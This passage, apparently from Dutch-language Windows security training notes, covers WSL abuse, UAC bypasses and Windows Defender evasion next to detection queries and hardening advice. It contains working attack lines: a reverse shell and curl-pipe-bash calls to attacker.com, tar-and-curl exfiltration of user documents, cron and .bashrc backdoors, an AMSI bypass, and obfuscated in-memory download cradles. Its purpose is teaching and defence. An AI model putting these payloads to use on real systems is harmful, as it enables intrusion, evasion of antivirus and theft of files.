- **Network traffic** vanuit WSL kan **anders** worden behandeld door firewalls
  ::

### WSL Persistence

**Scenario 1: Cron Jobs**

```bash
# Add malicious cron job in WSL
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/backdoor.sh") | crontab -

# Cron job survives tussen WSL sessions
```

**Scenario 2: .bashrc Modification**

```bash
# Add backdoor to .bashrc
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1 &' >> ~/.bashrc
```

**Scenario 3: Scheduled Tasks (Windows) → WSL Execution**

```powershell
# Create scheduled task die WSL gebruikt
schtasks /create /tn "WSLUpdate" /tr "wsl.exe -e /bin/bash -c '/tmp/payload.sh'" /sc onlogon /ru SYSTEM
```

## 🛡️ Defensive Monitoring van WSL

WSL activiteit kan worden gemonitord voor **detection van suspicious behavior**.

### WSL Process Detection

**Primary WSL Processes:**

- **wsl.exe** — Main WSL launcher
- **wslhost.exe** — WSL host process (manages Linux instances)
- **bash.exe** — Legacy WSL launcher (WSL 1)
- **LxssManager** service — WSL service

**Sysmon Event ID 1 (Process Creation):**

```powershell
# Monitor voor WSL process creation
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} |
Where {$_.Properties[4].Value -like "*wsl.exe*"}
```

### Suspicious WSL Command-Line Patterns

::important
**High-Risk WSL Command Patterns:**

**Network Connections:**

```
wsl.exe -e bash -c "bash -i >& /dev/tcp/IP/PORT"
wsl.exe -e curl http://attacker.com/payload.sh | bash
wsl.exe -e wget http://attacker.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m
```

**File Operations:**

```
wsl.exe -e bash -c "cat /mnt/c/Users/*/Documents/*.txt > /tmp/loot.txt"
wsl.exe -e tar -czf /tmp/exfil.tar.gz /mnt/c/sensitive/
wsl.exe -e find /mnt/c/ -name "password*"
```

**Execution:**

```
wsl.exe -e python3 -c "import os;os.system('/tmp/payload.sh')"
wsl.exe -e /bin/sh /tmp/reverse_shell.sh
```

::

### Event IDs voor WSL Monitoring

| Event ID | Log      | Beschrijving       | Relevantie                                            |
| -------- | -------- | ------------------ | ----------------------------------------------------- |
| **4688** | Security | Process Creation   | Track `wsl.exe` execution met command line arguments  |
| **1**    | Sysmon   | Process Creation   | Detailed WSL process creation met parent process info |
| **3**    | Sysmon   | Network Connection | WSL network connections (TCP/UDP)                     |
| **11**   | Sysmon   | File Created       | Files created in `\\wsl$\` filesystem                 |
| **13**   | Sysmon   | Registry Value Set | WSL-related registry modifications                    |
| **22**   | Sysmon   | DNS Query          | DNS queries vanuit WSL processes                      |
| **7045** | System   | Service Installed  | LxssManager service modifications                     |

### WSL File System Access

**WSL file system locatie:**

```
\\wsl$\<distro-name>\
\\wsl.localhost\<distro-name>\  (Windows 11)

Voorbeeld:
\\wsl$\Ubuntu-22.04\home\user\
\\wsl$\kali-linux\tmp\
```

::note
**File System Monitoring:**
Monitor toegang tot `\\wsl$\` via:

- **Event ID 5145** (Network Share Access) — Detect unusual SMB access to WSL filesystem
- **Sysmon Event ID 11** (File Created) — Track files created in WSL filesystem
- **File Integrity Monitoring** tools configured voor `\\wsl$\` path
  ::

### WSL Network Traffic Detection

**WSL 2 Networking:**

- WSL 2 gebruikt een **virtualized Ethernet adapter** (Hyper-V NAT)
- Eigen **IP address** in private subnet (typisch `172.x.x.x`)
- **Port forwarding** van Windows naar WSL via `localhost`

**Detection Strategy:**

```powershell
# Monitor network connections from WSL processes
Get-NetTCPConnection | Where {$_.OwningProcess -in (Get-Process wsl*).Id}

# Sysmon Event ID 3 - Network Connections
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=3} |
Where {$_.Properties[4].Value -like "*wsl*"}
```

## 🚨 WSL Hardening & Restrictions

### WSL Uitschakelen (High-Security Environments)

::caution
**High-Risk Environments:**
In environments waar WSL **niet nodig** is voor business operations, overweeg het **volledig uit te schakelen**:

```powershell
# Disable WSL feature (Administrator PowerShell)
Disable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux

# Disable via Group Policy
Computer Configuration → Administrative Templates → Windows Components → Windows Subsystem for Linux
→ "Allow the Windows Subsystem for Linux" → Disabled
```

::

### WSL Access Control via AppLocker

**Block WSL execution voor non-admin users:**

```xml
<!-- AppLocker rule to block wsl.exe -->
<RuleCollection Type="Exe">
  <FilePathRule Id="..." Name="Block WSL" Action="Deny">
    <Conditions>
      <FilePathCondition Path="%System32%\wsl.exe" />
    </Conditions>
  </FilePathRule>
</RuleCollection>
```

### WSL Audit Configuration

::important
**Defensive Monitoring Checklist:**

**Process Auditing:**

- ✅ Enable **Process Creation Auditing** (Event ID 4688) met command line logging
- ✅ Deploy **Sysmon** voor gedetailleerde process creation tracking (Event ID 1)
- ✅ Monitor **wsl.exe**, **wslhost.exe**, **bash.exe** execution

**Network Monitoring:**

- ✅ Monitor **Sysmon Event ID 3** voor WSL network connections
- ✅ Track **DNS queries** vanuit WSL (Sysmon Event ID 22)
- ✅ Alert op **suspicious outbound connections** (reverse shells, C2 traffic)

**File System Auditing:**

- ✅ Enable **Object Access Auditing** voor `\\wsl$\` share
- ✅ Monitor **Sysmon Event ID 11** voor file creation in WSL filesystem
- ✅ Implement **File Integrity Monitoring** op critical WSL directories

**Command-Line Analysis:**

- ✅ Alert op **suspicious command patterns** (bash -i, /dev/tcp, wget | bash)
- ✅ Detect **base64 encoded** commands in WSL execution
- ✅ Monitor voor **file exfiltration** patterns (curl -X POST, tar, zip)

**Service Monitoring:**

- ✅ Monitor **LxssManager** service state changes (Event ID 7040, 7045)
- ✅ Alert op **unexpected WSL service** starts/stops
  ::

### WSL Distribution Management

**List geïnstalleerde distributies:**

```powershell
wsl --list --verbose
```

**Unregister/verwijder distributie:**

```powershell
# Unregister distributie (verwijdert alle data!)
wsl --unregister Ubuntu-22.04

# Terminate running distributie
wsl --terminate Ubuntu-22.04

# Shutdown all WSL instances
wsl --shutdown
```

### WSL Update Management

```powershell
# Update WSL kernel
wsl --update

# Check WSL version
wsl --version

# Update distributie packages (binnen WSL)
wsl -d Ubuntu-22.04 -e sudo apt update && sudo apt upgrade -y
```

## 📋 Samenvatting

| Concept                 | Key Takeaway                                                                              |
| ----------------------- | ----------------------------------------------------------------------------------------- |
| **WSL**                 | Windows Subsystem for Linux — Run Linux binaries natively op Windows                      |
| **WSL 1 vs WSL 2**      | WSL 1 = translation layer, WSL 2 = real Linux kernel (Hyper-V VM)                         |
| **Installation**        | `wsl --install` of `Enable-WindowsOptionalFeature`                                        |
| **File Access**         | Windows volumes accessible via `/mnt/c`, `/mnt/d`, etc.                                   |
| **Offensive Use**       | Native Linux security tools, network pivoting, evasion, persistence                       |
| **LOLBIN**              | WSL kan gebruikt worden als Living Off the Land Binary voor evasion                       |
| **Detection**           | Sysmon Event IDs 1, 3, 11, 22 + Security Event ID 4688                                    |
| **Suspicious Patterns** | `/dev/tcp/`, `wget \| bash`, `base64 -d \| bash`, curl POST exfiltration                  |
| **Hardening**           | Disable WSL in high-security environments, AppLocker restrictions, comprehensive auditing |
| **Filesystem**          | `\\wsl$\<distro>\` accessible via SMB (monitor Event ID 5145)                             |

## 🔍 Quick Reference: WSL Commands

```powershell
# Installation & Management
wsl --install                          # Install WSL met default distro
wsl --install -d kali-linux            # Install specifieke distro
wsl --list --verbose                   # List geïnstalleerde distros
wsl --set-default-version 2            # Set WSL 2 als default
wsl --set-default Ubuntu-22.04         # Set default distro
wsl --unregister Ubuntu-22.04          # Remove distro
wsl --shutdown                         # Shutdown all WSL instances
wsl --terminate Ubuntu-22.04           # Terminate specifieke distro
wsl --update                           # Update WSL kernel

# Execution
wsl                                    # Start default distro
wsl -d kali-linux                      # Start specifieke distro
wsl -e bash -c "command"               # Execute command in default distro
wsl -d Ubuntu-22.04 -e ls /mnt/c       # Execute in specifieke distro
wsl --user root                        # Start as root user

# File System
\\wsl$\Ubuntu-22.04\                   # Access WSL filesystem via SMB
/mnt/c/Users/                          # Access Windows C: drive from WSL

# Export/Import (Backup)
wsl --export Ubuntu-22.04 ubuntu.tar   # Export distro
wsl --import Ubuntu-New C:\WSL\Ubuntu ubuntu.tar  # Import distro
```

## 🎯 Offensive vs. Defensive Cheat Sheet

**Offensive (Educational):**

```bash
# Reverse shell via WSL
wsl.exe -e bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"

# Download and execute
wsl.exe -e bash -c "curl http://attacker.com/payload.sh | bash"

# File exfiltration
wsl.exe -e bash -c "tar -czf - /mnt/c/Users/*/Documents/ | curl -X POST --data-binary @- http://attacker.com/exfil"

# Credential dumping
wsl.exe -e bash -c "grep -r 'password' /mnt/c/Users/"

# Persistence via cron
wsl.exe -e bash -c "(crontab -l; echo '* * * * * /tmp/backdoor.sh') | crontab -"

# Network scanning from WSL
wsl.exe -e nmap -sC -sV 192.168.1.0/24
```

**Defensive:**

```powershell
# Monitor WSL process creation
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} |
Where {$_.Properties[5].Value -like "*wsl.exe*"}

# Sysmon - WSL network connections
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=3} |
Where {$_.Properties[4].Value -like "*wsl*"}

# Check for suspicious WSL command patterns
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} |
Where {$_.Message -like "*wsl*" -and ($_.Message -like "*bash -i*" -or $_.Message -like "*/dev/tcp/*")}

# Monitor WSL filesystem access
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=5145} |
Where {$_.Message -like "*\\wsl$*"}

# List running WSL instances
wsl --list --running

# Terminate suspicious WSL instance
wsl --terminate <distro-name>

# Check WSL service status
Get-Service LxssManager
```

## 💡 Security Best Practices

::tip
**Voor Blue Team / Defenders:**

**WSL Policy:**

1. **Assess need** — Bepaal of WSL noodzakelijk is voor business operations
2. **Disable if unused** — In high-security environments zonder development needs
3. **Restrict access** — AppLocker/WDAC policies voor non-admin users
4. **Comprehensive logging** — Enable all audit points (process, network, filesystem)

**Monitoring Strategy:**

1. **Baseline normal usage** — Understand legitimate WSL usage patterns
2. **Alert on anomalies** — Unexpected users, times, command patterns
3. **Network monitoring** — Track WSL network connections (especially outbound)
4. **File system auditing** — Monitor `\\wsl$\` access and modifications
5. **Regular reviews** — Periodic review van geïnstalleerde distributies

**Incident Response:**

1. **Isolate** — `wsl --shutdown` to terminate all instances
2. **Collect evidence** — Export WSL filesystem (`wsl --export`)
3. **Analyze** — Review Event Logs, Sysmon events, command-line arguments
4. **Remediate** — `wsl --unregister` to remove compromised distribution
5. **Harden** — Implement additional controls based on findings
   ::

::note
**Voor Red Team / Penetration Testers:**
WSL is een **legitieme business tool** die krachtige offensive capabilities biedt. Gebruik het **verantwoord** binnen de scope van authorized engagements. Documenteer WSL usage in reports om defenders te helpen detection capabilities te verbeteren.
::

## UAC

### UAC Bypass Techniques (Educational)

::caution
**UAC is geen security boundary!**
Microsoft beschouwt UAC **NIET** als een security boundary. Het is een **convenience feature** om accidental system changes te voorkomen, niet om dedicated attackers tegen te houden.
::

**Common UAC Bypass Methods:**

1. **Fodhelper.exe** — Registry hijacking (HKCU\Software\Classes\ms-settings\shell\open\command)
2. **EventVwr.exe** — Registry hijacking (HKCU\Software\Classes\mscfile\shell\open\command)
3. **ComputerDefaults.exe** — Registry hijacking
4. **DiskCleanup.exe** — Scheduled task DLL hijacking
5. **Token impersonation** — Steal elevated token from high-integrity process

**Detection:**

- Monitor **registry modifications** in HKCU\Software\Classes\
- Track **unusual parent-child relationships** (eventvwr.exe spawning cmd.exe)
- Alert op **high-integrity processes** started by medium-integrity processes

## security

## 🎯 Offensive Bypasses (Educational)

### Windows Defender Evasion Techniques

::caution
**Disclaimer:**
Deze technieken zijn **uitsluitend educatief** en bedoeld voor **authorized penetration testing** en **security research**. Gebruik alleen binnen scope van engagement.
::

**1. Obfuscation:**

```powershell
# String obfuscation
$cmd = "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell.exe -enc $encoded

# Character substitution
$payload = "I`E`X (N`ew-Ob`ject Net`.WebC`lient).Dow`nloadStri`ng('http://attacker.com/p.ps1')"
```

**2. AMSI Bypass:**

```powershell
# AMSI bypass (example, many signatures exist)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**3. In-Memory Execution:**

```powershell
# Reflective DLL injection (no disk write)
$bytes = (New-Object Net.WebClient).DownloadData('http://attacker.com/payload.dll')
[System.Reflection.Assembly]::Load($bytes)
```

**4. Process Hollowing:**

```
Create suspended process → Unmap memory → Inject malicious code → Resume
```

**5. Packing/Crypting:**

- **UPX packing** (simple maar detecteerbaar)
- **Custom packers** (runtime decryption)
- **Polymorphic code** (self-modifying)

**Detection by Defender:**
Windows Defender **zal** common frameworks detecteren:

- **Metasploit** payloads (unmodified)
- **Mimikatz** (standard binary)
- **Cobalt Strike** beacons (unobfuscated)

::important
**Modern Bypass Reality:**
Hoewel het steeds moeilijker wordt, is het nog steeds mogelijk om Windows Defender **fully te bypassen** met:

- **Custom tooling** (avoid known signatures)
- **Obfuscation** (multiple layers)
- **In-memory execution** (reflective loading)
- **Living off the land** (LOLBINs)
- **Behavioral evasion** (anti-sandbox, delayed execution)
  ::

## 🛡️ Defensive Recommendations

::important
**Voor Blue Team / Security Engineers:**

**Windows Defender Hardening:**

1. **Enable all protection features**:
   - Real-time Protection
   - Cloud-delivered Protection
   - Automatic Sample Submission
   - Tamper Protection
   - Controlled Folder Access (Ransomware protection)

2. **Minimize exclusions**:
   - Audit current exclusions regularly
   - Remove unnecessary exclusions
   - Monitor changes to exclusions (Event ID 5007)

3. **Keep definitions updated**:
   - Automatic updates enabled
   - Verify last update timestamp
   - Monitor update failures

**AppLocker Implementation:**

1. **Enable DLL rules** (despite performance impact)
2. **Script rules** voor PowerShell, VBScript, JavaScript
3. **Audit mode first** voor testing
4. **Regular rule reviews** and updates

**Group Policy Hardening:**

1. **Credential Guard** — Enable on all compatible systems
2. **LSASS Protection** — RunAsPPL via Group Policy
3. **PowerShell Logging**:
   - Script Block Logging
   - Module Logging
   - Transcription
4. **Restrict software** installation to admins
5. **Enforce strong password policies**

**Registry Monitoring:**

1. **Sysmon Event ID 12, 13, 14** — Registry events
2. **Alert on Run key modifications**
3. **Monitor SAM/SECURITY hive access attempts**
4. **Audit policy changes** via registry

**UAC Configuration:**

1. **Set to highest level** ("Always notify")
2. **Monitor UAC bypass attempts** (registry HKCU\Software\Classes\ modifications)
3. **Restrict standard users** from admin tasks
   ::

## 📋 Samenvatting

| Concept              | Key Takeaway                                                                                        |
| -------------------- | --------------------------------------------------------------------------------------------------- |
| **SID**              | Security Identifier — Uniek voor elke security principal, format: S-1-5-21-domain-RID               |
| **SAM**              | Security Accounts Manager — Slaat local user password hashes op in `C:\Windows\System32\config\SAM` |
| **ACL/ACE**          | Access Control Lists/Entries — Definiëren permissions voor securable objects                        |
| **UAC**              | User Account Control — Convenience feature, geen security boundary, bypasses mogelijk               |
| **Registry**         | Hierarchical database — Critical settings in HKLM, user settings in HKCU                            |
| **Run Keys**         | Persistence location — HKLM/HKCU\Software\Microsoft\Windows\CurrentVersion\Run                      |
| **Whitelisting**     | Zero-trust approach — Only explicitly allowed software kan draaien                                  |
| **AppLocker**        | Application whitelisting — Rules based on publisher, path, or hash                                  |
| **Group Policy**     | Configuration management — Computer en User settings, security policies                             |
| **Windows Defender** | Built-in AV — Real-time protection, cloud-delivered, tamper protection                              |

## 🔍 Quick Reference: Security Commands

```powershell
# SID Information
whoami /user
whoami /groups
whoami /priv

# Registry Queries
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SAM  # Requires SYSTEM privileges
reg query HKLM\SECURITY  # Requires SYSTEM privileges

# Windows Defender
Get-MpComputerStatus
Get-MpPreference
Get-MpThreat
Update-MpSignature
Set-MpPreference -DisableRealtimeMonitoring $true  # Requires admin

# AppLocker
Get-AppLockerPolicy -Effective -Xml
Get-AppLockerPolicy -Local
Test-AppLockerPolicy -Path C:\payload.exe -User Domain\User

# Group Policy
gpresult /R  # Resultant Set of Policy
gpupdate /force  # Force Group Policy update
gpedit.msc  # Local Group Policy Editor (GUI)

# Access Control
icacls C:\path\to\file
Get-Acl C:\path\to\file | Format-List
```

## 💡 Best Practices

::tip
**Security Baseline:**

**System Hardening:**

1. **Least privilege** — Users met minimum required permissions
2. **Application control** — AppLocker/WDAC enforced
3. **Credential protection** — Credential Guard, LSASS Protection
4. **Logging enabled** — Comprehensive audit policies
5. **Patch management** — Regular updates deployed

**Defense in Depth:**

1. **Antivirus** — Windows Defender fully configured
2. **Firewall** — Host-based firewall rules
3. **EDR** — Endpoint Detection and Response deployed
4. **Network segmentation** — Limit lateral movement
5. **Multi-factor authentication** — MFA for all admin accounts

**Monitoring & Detection:**

1. **Event logging** — Security, System, Application logs
2. **Sysmon deployment** — Enhanced process/network logging
3. **Registry monitoring** — Alert on Run key changes
4. **Anomaly detection** — Baseline normal behavior
5. **Threat hunting** — Proactive searching voor IOCs
   ::
